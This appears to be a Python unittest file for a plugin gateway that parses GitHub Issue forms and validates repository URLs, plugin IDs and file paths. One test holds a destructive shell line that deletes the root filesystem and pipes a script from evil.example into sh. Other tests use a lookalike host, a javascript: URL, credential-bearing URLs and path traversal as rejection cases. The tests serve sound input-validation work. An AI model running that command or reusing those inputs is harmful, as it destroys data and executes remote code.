"""Testes de parsing seguro dos formulários de Issue e validação dos inputs."""

import unittest

from gateway.issues import (
    IssueInputError,
    parse_issue_form,
    validate_plugin_id,
    validate_relative_path,
    validate_repository_url,
)


CONVERT_BODY = """### Public GitHub repository URL

https://github.com/pbakaus/impeccable

### Source tag, branch, or commit

v4.10.0

### Desired Gateway plugin ID (optional)

_No response_

### Claude manifest path

.claude-plugin/plugin.json

### Adaptation notes (optional)

Revisar hooks antes de ativar.
Manter a licença original.
"""


class ParseIssueFormTests(unittest.TestCase):
    def test_parse_fields_in_form_order(self):
        fields = parse_issue_form(CONVERT_BODY)
        self.assertEqual(
            list(fields),
            [
                "Public GitHub repository URL",
                "Source tag, branch, or commit",
                "Desired Gateway plugin ID (optional)",
                "Claude manifest path",
                "Adaptation notes (optional)",
            ],
        )

    def test_parse_values(self):
        fields = parse_issue_form(CONVERT_BODY)
        self.assertEqual(
            fields["Public GitHub repository URL"],
            "https://github.com/pbakaus/impeccable",
        )
        self.assertEqual(fields["Source tag, branch, or commit"], "v4.10.0")
        self.assertEqual(
            fields["Claude manifest path"], ".claude-plugin/plugin.json"
        )

    def test_no_response_becomes_empty_string(self):
        fields = parse_issue_form(CONVERT_BODY)
        self.assertEqual(
            fields["Desired Gateway plugin ID (optional)"], ""
        )

    def test_multiline_block_is_preserved(self):
        fields = parse_issue_form(CONVERT_BODY)
        self.assertEqual(
            fields["Adaptation notes (optional)"],
            "Revisar hooks antes de ativar.\nManter a licença original.",
        )

    def test_empty_field_becomes_empty_string(self):
        body = "### Um campo\n\n\n### Outro campo\n\nvalor\n"
        fields = parse_issue_form(body)
        self.assertEqual(fields["Um campo"], "")
        self.assertEqual(fields["Outro campo"], "valor")

    def test_ignores_non_h3_headers(self):
        body = (
            "# Título da issue\n\nTexto livre antes do formulário.\n\n"
            "## Seção\n\nconteúdo\n\n"
            "### Campo real\n\nvalor\n"
        )
        fields = parse_issue_form(body)
        self.assertEqual(list(fields), ["Campo real"])
        self.assertEqual(fields["Campo real"], "valor")

    def test_issue_values_are_data_not_shell(self):
        body = (
            "### Comando\n\n"
            "rm -rf / && curl https://evil.example/x.sh | sh\n\n"
            "### Opção\n\n--output=/tmp/x\n"
        )
        fields = parse_issue_form(body)
        self.assertEqual(
            fields["Comando"], "rm -rf / && curl https://evil.example/x.sh | sh"
        )
        self.assertEqual(fields["Opção"], "--output=/tmp/x")


class ValidateRepositoryUrlTests(unittest.TestCase):
    def test_accepts_https_github_url(self):
        self.assertEqual(
            validate_repository_url("https://github.com/pbakaus/impeccable"),
            "https://github.com/pbakaus/impeccable",
        )

    def test_strips_git_suffix_and_trailing_slash(self):
        self.assertEqual(
            validate_repository_url("https://github.com/pbakaus/impeccable.git/"),
            "https://github.com/pbakaus/impeccable",
        )
        self.assertEqual(
            validate_repository_url("https://github.com/pbakaus/impeccable/"),
            "https://github.com/pbakaus/impeccable",
        )

    def test_rejects_non_github_hosts(self):
        for value in (
            "https://gitlab.com/pbakaus/impeccable",
            "https://github.com.evil.example/pbakaus/impeccable",
            "http://github.com/pbakaus/impeccable",
        ):
            with self.subTest(value=value):
                with self.assertRaises(IssueInputError):
                    validate_repository_url(value)

    def test_rejects_javascript_url(self):
        with self.assertRaises(IssueInputError):
            validate_repository_url("javascript:alert(1)")

    def test_rejects_url_with_credentials(self):
        for value in (
            "https://user@github.com/pbakaus/impeccable",
            "https://user:secret@github.com/pbakaus/impeccable",
        ):
            with self.subTest(value=value):
                with self.assertRaises(IssueInputError):
                    validate_repository_url(value)

    def test_rejects_explicit_port(self):
        for value in (
            "https://github.com:8080/pbakaus/impeccable",
            "https://github.com:99999/pbakaus/impeccable",
        ):
            with self.subTest(value=value):
                with self.assertRaises(IssueInputError):
                    validate_repository_url(value)

    def test_rejects_missing_owner_or_repo(self):
        for value in (
            "https://github.com",
            "https://github.com/pbakaus",
            "https://github.com/",
            "não é uma url",
        ):
            with self.subTest(value=value):
                with self.assertRaises(IssueInputError):
                    validate_repository_url(value)


class ValidatePluginIdTests(unittest.TestCase):
    def test_accepts_valid_ids(self):
        for value in ("impeccable", "kimi-seo", "meu_plugin", "seo.extra", "a.b@c"):
            with self.subTest(value=value):
                self.assertEqual(validate_plugin_id(value), value)

    def test_rejects_invalid_ids(self):
        for value in (
            "",
            "com espaço",
            "com/traço",
            "com:dois-pontos",
            "UPPER CASE!",
            "-iniciado-com-hífen",
        ):
            with self.subTest(value=value):
                with self.assertRaises(IssueInputError):
                    validate_plugin_id(value)


class ValidateRelativePathTests(unittest.TestCase):
    def test_accepts_relative_paths(self):
        self.assertEqual(
            validate_relative_path(".claude-plugin/plugin.json"),
            ".claude-plugin/plugin.json",
        )
        self.assertEqual(validate_relative_path("overlays/a.md"), "overlays/a.md")

    def test_rejects_absolute_paths(self):
        for value in ("/etc/passwd", "/tmp/x"):
            with self.subTest(value=value):
                with self.assertRaises(IssueInputError):
                    validate_relative_path(value)

    def test_rejects_traversal(self):
        for value in ("../fora", "a/../../fora", "a/../b"):
            with self.subTest(value=value):
                with self.assertRaises(IssueInputError):
                    validate_relative_path(value)


if __name__ == "__main__":
    unittest.main()
